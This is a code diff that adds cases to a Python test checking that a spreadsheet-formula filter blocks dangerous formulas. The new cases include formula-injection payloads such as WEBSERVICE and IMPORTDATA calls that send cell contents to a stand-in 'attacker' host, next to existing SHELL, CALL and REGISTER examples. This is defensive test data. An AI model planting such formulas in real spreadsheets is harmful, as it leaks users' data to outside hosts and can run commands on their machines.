@@ -40,6 +40,13 @@ class TestFormulaSafety:
             '=CALL("x","y","z")',
             '=REGISTER("x","y","z")',
             '= SHELL ( "calc" )',  # 空格混淆
+            # H-2 第二轮新增
+            '=WEBSERVICE("http://attacker/?d="&A1)',
+            '=FILTERXML(WEBSERVICE("..."), "//x")',
+            '=RTD("server","a","b")',
+            '=IMPORTDATA("http://attacker/")',
+            '=_XLFN.WEBSERVICE("http://attacker/")',
+            "=ENCODEURL(A1)",
         ],
     )
     def test_dangerous_formulas_blocked(self, danger):
